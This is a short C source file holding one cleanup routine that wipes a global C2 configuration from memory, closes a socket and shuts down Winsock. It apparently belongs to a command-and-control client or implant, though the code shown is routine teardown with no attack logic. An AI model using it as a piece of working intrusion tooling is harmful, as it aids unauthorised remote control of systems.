#include "../include/common.h"

void Cleanup() {
    printf("[UTILS] Cleaning up resources...\n");

    // Nettoyer la config
    SecureZeroMemory(&g_c2_config, sizeof(C2_CONFIG));

    // Fermer socket si ouvert
    if (g_c2_socket != INVALID_SOCKET) {
        closesocket(g_c2_socket);
        g_c2_socket = INVALID_SOCKET;
    }

    // Nettoyer Winsock
    WSACleanup();

    printf("[UTILS] Cleanup completed\n");
}
